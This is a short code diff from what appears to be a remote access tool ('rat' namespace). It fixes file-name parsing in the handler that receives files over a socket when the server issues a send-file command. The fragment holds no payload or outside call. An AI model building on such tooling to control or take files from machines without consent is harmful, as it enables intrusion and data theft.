@@ -228,7 +228,8 @@ void HandleClient::ControlClient()
 		if (server_cmd.GetType() == static_cast<int>(rat::Command::CommandType::kClientSendFile))
 		{
 			std::string file_path = server_cmd.GetArgument();
-			std::string file_name = file_path.substr(file_path.rfind('/') + 1).substr(file_path.rfind('/') + 1);
+        	std::replace(file_path.begin(), file_path.end(), '\\', '/');
+			std::string file_name = file_path.substr(file_path.rfind('/') + 1);
 
 			File f(file_name);
 			f.RecvFileThroughSocket(sock);
